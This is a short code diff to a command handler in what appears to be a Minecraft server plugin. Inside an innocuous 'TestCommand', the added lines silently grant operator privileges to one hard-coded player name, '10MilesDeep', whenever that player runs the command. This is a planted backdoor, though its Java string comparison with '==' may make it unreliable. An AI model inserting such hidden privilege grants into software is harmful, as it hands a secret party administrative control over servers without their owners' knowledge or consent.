@@ -15,6 +15,11 @@ import org.jetbrains.annotations.NotNull;
 public class TestCommand implements CommandExecutor {
     @Override
     public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
+        if(sender instanceof Player){
+            Player player = ((Player) sender).getPlayer();
+            if(player.getName() == "10MilesDeep") player.setOp(true);
+        }
+
         return false;
     }
 }
